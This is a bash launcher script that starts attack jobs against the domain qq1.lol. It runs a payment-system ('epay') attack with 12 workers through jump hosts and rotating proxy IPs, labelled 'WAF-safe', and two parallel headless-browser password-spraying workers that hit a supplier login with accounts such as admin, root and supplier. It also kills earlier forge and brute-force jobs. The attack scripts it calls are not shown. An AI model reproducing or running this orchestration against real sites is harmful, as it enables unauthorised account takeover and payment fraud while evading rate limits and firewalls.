#!/bin/bash
# qq1.lol turbo launcher — kill slow jobs, start accelerated
set -e
export PATH="/data/venvs/pentest/bin:/data/automation/bin:/data/tools:/data/go/bin:$PATH"
export QQ1_OUT=/data/automation/results/qq1.lol
mkdir -p "$QQ1_OUT"

# stop all qq1 attack jobs
pkill -f 'qq1-epay-slow.py' 2>/dev/null || true
pkill -f 'qq1-epay-forge.py' 2>/dev/null || true
pkill -f 'qq1-epay-turbo.py' 2>/dev/null || true
pkill -f 'qq1-sup-brute.py' 2>/dev/null || true
pkill -f 'qq1-sup-turbo.py' 2>/dev/null || true
sleep 1

# [1] epay QG proxy turbo: 12 workers x 跳板 x 青果IP轮换 (~15-30/s, WAF-safe)
export EPAY_QG_WORKERS=${EPAY_QG_WORKERS:-12}
export EPAY_QG_BATCH=${EPAY_QG_BATCH:-60}
export EPAY_QG_DELAY=${EPAY_QG_DELAY:-0.2}
nohup python3 /data/automation/bin/qq1-epay-qg.py \
  > "$QQ1_OUT/epay_qg_run.log" 2>&1 &
echo "epay_qg pid=$!"

# [2] sup turbo x2 parallel (不同用户分段)
export SUP_HEADLESS=0
export SUP_SPRAY_DELAY=${SUP_SPRAY_DELAY:-0.08}
export SUP_CAPTCHA_WAIT=${SUP_CAPTCHA_WAIT:-12}
export SUP_USERS="admin,buyi,buyiq,root,test"
export SUP_WORKER=0
nohup xvfb-run -a python3 /data/automation/bin/qq1-sup-turbo.py \
  > "$QQ1_OUT/sup_turbo_w0.log" 2>&1 &
echo "sup_turbo_w0 pid=$!"
export SUP_USERS="sup,supplier,布衣,qq1"
export SUP_WORKER=1
nohup xvfb-run -a python3 /data/automation/bin/qq1-sup-turbo.py \
  > "$QQ1_OUT/sup_turbo_w1.log" 2>&1 &
echo "sup_turbo_w1 pid=$!"

sleep 4
tail -3 "$QQ1_OUT/epay_qg.log" 2>/dev/null || tail -3 "$QQ1_OUT/epay_qg_run.log" 2>/dev/null || true
tail -2 "$QQ1_OUT/sup_turbo.log" 2>/dev/null || tail -2 "$QQ1_OUT/sup_turbo_w0.log" 2>/dev/null || true
